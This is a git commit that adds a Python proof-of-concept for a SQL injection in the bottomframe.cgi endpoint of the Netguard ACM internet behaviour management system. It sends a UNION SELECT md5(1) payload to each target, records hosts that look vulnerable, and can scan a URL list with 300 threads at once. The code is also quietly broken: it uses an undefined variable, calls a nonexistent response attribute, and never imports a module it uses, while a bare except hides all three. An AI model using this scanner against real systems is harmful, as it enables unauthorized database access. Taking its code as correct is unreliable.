66c8e3d79549f901a9e2800555d279f9bdcc43df
wyn-lk <cloundside@gmail.com>
2024-07-01 19:57:15 +0800

    Add files via upload

---
+++ POC/网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞/1.py
@@ -0,0 +1,69 @@
+ # 
+import requests,argparse,time
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings() # 解除警告
+GREEN = '\033[92m'
+RESET = '\033[0m'
+proxies = { 
+       "http": "http://127.0.0.1:8080", 
+       "https": "http://127.0.0.1:8080" 
+       }
+def banner():
+	banner = """
+
+	██████╗██╗  ██╗ ██████╗ ███████╗███████╗███╗   ██╗ ██╗
+██╔════╝██║  ██║██╔═══██╗██╔════╝██╔════╝████╗  ██║███║
+██║     ███████║██║   ██║███████╗█████╗  ██╔██╗ ██║╚██║
+██║     ██╔══██║██║   ██║╚════██║██╔══╝  ██║╚██╗██║ ██║
+╚██████╗██║  ██║╚██████╔╝███████║███████╗██║ ╚████║ ██║
+ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═╝
+                                     info:网御 ACM上网行为管理系统 bottomframe.cgi SQL注入漏洞
+	"""
+	print(banner)
+def poc(target):
+	payload_url = "/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23"
+	url = target + payload_url
+	headers={
+		'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
+		'Accept-Encoding': 'gzip,deflate',
+		'Accept': '*/*',
+		'Connection': 'Keep-Alive'
+	}
+	try:
+		res = requests.get(url=target,verify=False)
+		res1 = requests.get(url=url,headers=headers,data=data,verify=False)
+		if res.status_code == 200:
+			if res1.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res1.txt:
+				print(f"{GREEN}[+]该url存在SQL注入漏洞：{target}{RESET}")
+				with open("result.txt","a",encoding="utf-8") as f:
+					f.write(target+"\n")
+			else:
+				print(f"[-]该url不存在SQL注入漏洞：{target}")
+		else:
+			print(f"该url连接失败：{target}")
+	except:
+		print(f"[*]该url出现错误：{target}")
+
+def main():
+	banner()
+	parser = argparse.ArgumentParser()
+	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
+	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
+	args = parser.parse_args()
+	if args.url and not args.file:
+		poc(args.url)
+	elif args.file and not args.url:
+		url_list = []
+		with open(args.file,"r",encoding="utf-8") as f:
+			for i in f.readlines():
+				url_list.append(i.strip().replace("\n",""))
+		mp = Pool(300)
+		mp.map(poc,url_list)
+		mp.close()
+		mp.join()
+	else:
+		print(f"\n\tUage:python {sys.argv[0]} -h")
+
+
+if __name__ == "__main__":
+	main()
